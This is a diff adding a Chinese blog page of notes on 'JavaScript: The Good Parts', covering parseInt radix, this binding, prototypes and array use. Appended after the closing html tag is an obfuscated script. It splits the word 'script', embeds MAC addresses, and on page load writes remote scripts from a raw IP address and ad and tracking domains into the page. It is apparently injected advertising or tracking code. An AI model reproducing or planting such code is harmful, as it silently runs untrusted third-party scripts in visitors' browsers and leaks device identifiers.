@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>《Javascript语言精粹》——总结</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="http://www.newhuan.info/css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="http://www.newhuan.info/blog" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">《Javascript语言精粹》——总结</h1>
+                <h3 class="date">20150818</h3>
+                <div class="clearfix typo">
+                    <p>parseInt(num, base);//最好总是提供base参数用于指定转换的number的进制，避免由0或0x开头的字符串被转化为8或16进制数字。</p>
+
+                    <p>函数在任何位置（包括局部作用域内）进行函数调用的时候(foo();)，其中的this指针都指向全局window对象；
+但是，如果某个函数在函数体内应用了严格模式，那么此函数自身以及其内部定义的函数进行'函数调用'(foo();)时，this指针指向undefined或null（根据js引擎解析的不同而不同）</p>
+                    <p>
+                        尽量使用双引号而不是单引号
+                    </p>
+
+                    <pre>
+                        <code>
+Function.prototype.method = function(name, func){
+//再此function对象的prototype上定义一个名字是name，值是func的属性；
+    this.prototype[name] = func;
+    return this;//级联
+}
+                        </code>
+                    </pre>
+
+                    <p>
+                        字面量（literal）是用于表达源代码中一个固定值的表示法（notation）
+                    </p>
+                    <p>
+                        尝试检索一个undefined值上的属性会报一个TypeError
+                    </p>
+                    <pre>
+                        <code>
+Object.beget = function (o) {
+//创建一个以o对象作为原型链的新对象；Object.create();
+    var F = function () {};
+    F.prototype = o;
+    return new F();
+}
+                        </code>
+                    </pre>
+                    <p>
+                        编程 => 将一组需求分解成一组函数与数据结构（函数式编程？）
+                    </p>
+                    <p>
+                        表现力：代码能很清晰的表达自己做的事
+                    </p>
+                    <p>
+                        自定义事件：键名为事件名，值为一个数组，元素是事件处理方法；添加时，如果没有此键，初始化并赋值为数组；再次添加时，向数组中push；触发时，检索事件名，按数组顺序依次调用数组中的事件处理方法；
+                    </p>
+                    <p>
+                        当属性名是小而连续的整数时，使用数组，否则使用对象；数组的splice方法比较慢；js数组的内存地址不是连续的，本质是一个键名为连续整数的对象；
+                    </p>
+                    <p>
+                        return语句后面的表达式的开始部分必须和return处于同一行
+                    </p>
+                    <p>
+                        使用关键字作为key时使用下标表示法(['case'])(但是还是尽可能的不要使用关键字作为key)
+                    </p>
+                    <p>
+                        为了避免浮点数异常，需要处理高精度小数时，可以转化为整数进行整数运算，再把结果转为小数(*100/100)
+                    </p>
+                    <p>
+                        尽量避免continue关键字，影响性能
+                    </p>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
